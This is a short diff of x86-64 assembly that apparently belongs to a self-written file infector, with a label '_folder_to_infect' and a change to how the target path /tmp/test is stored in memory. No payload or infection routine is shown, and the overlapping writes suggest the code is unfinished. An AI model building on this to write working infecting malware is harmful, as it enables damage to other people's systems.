@@ -95,7 +95,7 @@ _start:
 _folder_to_infect:	
 	mov qword [r15], '/tmp'
 	mov qword [r15 + 4], '/tes'
-	mov qword [r15 + 8], 0x00000074                ; assigning /tmp/test to the beginning of the r15 register
+	mov qword [r15 + 8], 't/'                ; assigning /tmp/test to the beginning of the r15 register
 
 	; mov rdi, r15                                 ; ?????????????
 	; mov [r15 + 16], rax
